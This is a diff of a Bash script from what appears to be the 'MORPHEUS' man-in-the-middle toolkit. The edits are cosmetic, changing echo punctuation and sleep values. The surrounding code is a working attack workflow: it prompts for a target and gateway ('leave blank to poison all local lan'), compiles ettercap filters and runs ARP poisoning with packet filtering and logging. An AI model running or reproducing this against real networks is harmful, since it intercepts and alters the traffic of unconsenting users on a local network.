@@ -9,7 +9,7 @@
 ###
 # Resize terminal windows size befor running the tool (gnome terminal)
 # Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
-resize -s 30 86 > /dev/null
+resize -s 31 86 > /dev/null
 # inicio
 
 
@@ -181,47 +181,47 @@ echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter RHOST ☠" --text "example: $IP\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}...${Reset};
+  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.bk > /dev/null 2>&1
   sleep 1
-  echo ${BlueF}[☠]${white} Edit firewall.eft '(filter)'${RedF}...${Reset};  
+  echo ${BlueF}[☠]${white} Edit firewall.eft '(filter)'${RedF}!${Reset};  
   xterm -T "MORPHEUS - firewall filter" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
   sleep 1
 
     # compiling firewall.eft to be used in ettercap
-    echo ${BlueF}[☠]${white} Compiling firewall.eft${RedF}...${Reset};
+    echo ${BlueF}[☠]${white} Compiling firewall.eft${RedF}!${Reset};
     xterm -T "MORPHEUS - compiling" -geometry 100x30 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
     sleep 1
 
       # run mitm+filter
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}...${Reset};
-      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}...${Reset};   
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}...${Reset};
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}...${Reset};
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}...${Reset};
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}...${Reset};
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost/ /$gateway/
         fi
       fi
     
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}...${Reset};
+  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/firewall.bk $IPATH/filters/firewall.eft > /dev/null 2>&1
-  sleep 1
+  sleep 2
 
 else
   echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
@@ -250,47 +250,47 @@ echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter RHOST ☠" --text "example: $IP\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}...${Reset};
+  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   cp $IPATH/filters/skelleton.eft $IPATH/filters/skelleton.bk > /dev/null 2>&1
   sleep 1
-  echo ${BlueF}[☠]${white} Edit skelleton '(filter)'${RedF}...${Reset};  
+  echo ${BlueF}[☠]${white} Edit skelleton '(filter)'${RedF}!${Reset};  
   xterm -T "MORPHEUS - skelleton filter" -geometry 115x36 -e "nano $IPATH/filters/skelleton.eft"
   sleep 1
 
     # compiling skelleton.eft to be used in ettercap
-    echo ${BlueF}[☠]${white} Compiling skelleton${RedF}...${Reset};
+    echo ${BlueF}[☠]${white} Compiling skelleton${RedF}!${Reset};
     xterm -T "MORPHEUS - compiling" -geometry 100x30 -e "etterfilter $IPATH/filters/skelleton.eft -o $IPATH/output/skelleton.ef && sleep 3"
     sleep 1
 
       # run mitm+filter
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}...${Reset};
-      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}...${Reset};   
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}...${Reset};
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}...${Reset};
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -L $IPATH/logs/skelleton -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}...${Reset};
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}...${Reset};
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -L $IPATH/logs/skelleton -M ARP /$rhost/ /$gateway/
         fi
       fi
     
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}...${Reset};
+  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/skelleton.bk $IPATH/filters/skelleton.eft > /dev/null 2>&1
-  sleep 1
+  sleep 2
 
 else
   echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
